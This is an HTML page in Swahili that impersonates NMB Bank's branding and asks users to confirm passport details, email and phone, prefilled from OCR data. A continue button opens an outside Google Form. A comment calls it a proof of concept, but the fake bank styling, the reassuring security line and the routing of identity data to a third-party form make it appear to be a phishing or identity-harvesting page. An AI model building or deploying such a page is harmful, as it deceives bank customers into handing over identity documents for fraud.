<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thibitisha Taarifa â€“ NMB</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <img src="images/nmb_logo.png" alt="NMB Bank" class="logo">

    <h1>Saidia kuhudumiwa haraka</h1>
    <p class="subtitle">Thibitisha taarifa zako ili kuendelea</p>

    <div class="card">
        <div class="card-header">
            <h2>Taarifa Zilizopatikana</h2>
        </div>

        <!-- Passport Fields -->
        <div class="field">
            <label>First Name</label>
            <input type="text" id="firstName">
        </div>

        <div class="field">
            <label>Last Name</label>
            <input type="text" id="lastName">
        </div>

        <div class="field">
            <label>Passport Number</label>
            <input type="text" id="passportNumber">
        </div>

        <div class="field">
            <label>Nationality</label>
            <input type="text" id="nationality">
        </div>

        <div class="field">
            <label>Date of Birth</label>
            <input type="date" id="dateOfBirth">
        </div>

        <div class="field">
            <label>Gender</label>
            <select id="gender">
                <option value="">Chagua</option>
                <option value="Male">Mwanaume</option>
                <option value="Female">Mwanamke</option>
            </select>
        </div>

        <div class="field">
            <label>Expiry Date</label>
            <input type="date" id="expiryDate">
        </div>

        <!-- Extra fields -->
        <div class="field">
            <label>Email</label>
            <input type="email" id="email">
        </div>

        <div class="field">
            <label>Phone</label>
            <input type="tel" id="phone">
        </div>
    </div>

    <div class="actions">
        <button class="btn btn-retake" onclick="location.href='camera.html'">
            Piga picha tena
        </button>

        <button class="btn btn-continue" id="continueBtn">
            Endelea
        </button>
    </div>

    <p class="security">ðŸ”’ Taarifa zako zinalindwa kwa usalama wa hali ya juu</p>
</div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        // --- 1. Get OCR or dummy fallback data ---
        let ocrData = JSON.parse(sessionStorage.getItem("ocrData") || "{}");

        // If empty, inject dummy data for PoC
        if (!ocrData.firstName) {
            ocrData = {
                firstName: "JOHN",
                lastName: "DOE",
                passportNumber: "A1234567",
                nationality: "USA",
                dateOfBirth: "1990-01-01",
                gender: "Male",
                expiryDate: "2030-01-01"
            };
            sessionStorage.setItem("ocrData", JSON.stringify(ocrData));
        }

        // --- 2. Prefill form fields ---
        document.getElementById('firstName').value = ocrData.firstName;
        document.getElementById('lastName').value = ocrData.lastName;
        document.getElementById('passportNumber').value = ocrData.passportNumber;
        document.getElementById('nationality').value = ocrData.nationality;
        document.getElementById('dateOfBirth').value = ocrData.dateOfBirth;
        document.getElementById('gender').value = ocrData.gender;
        document.getElementById('expiryDate').value = ocrData.expiryDate;

        // Email & Phone
        document.getElementById('email').value = sessionStorage.getItem("email") || "";
        document.getElementById('phone').value = sessionStorage.getItem("phone") || "";

        // --- 3. Continue button ---
        document.getElementById('continueBtn').addEventListener('click', () => {
            const confirmedData = {
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                passportNumber: document.getElementById('passportNumber').value,
                nationality: document.getElementById('nationality').value,
                dateOfBirth: document.getElementById('dateOfBirth').value,
                gender: document.getElementById('gender').value,
                expiryDate: document.getElementById('expiryDate').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value
            };

            console.log("User confirmed data:", confirmedData);
            sessionStorage.setItem("confirmedData", JSON.stringify(confirmedData));

            // --- Open NIC in a new tab (avoids browser security block) ---
            window.open("https://docs.google.com/forms/d/e/1FAIpQLScJWSvFw76jO1EexVx4XZ49Pp8y5pDLVZ-5adMgz5d3ixuu9w/viewform?usp=header", "_blank");
        });
    });
</script>


</body>
</html>
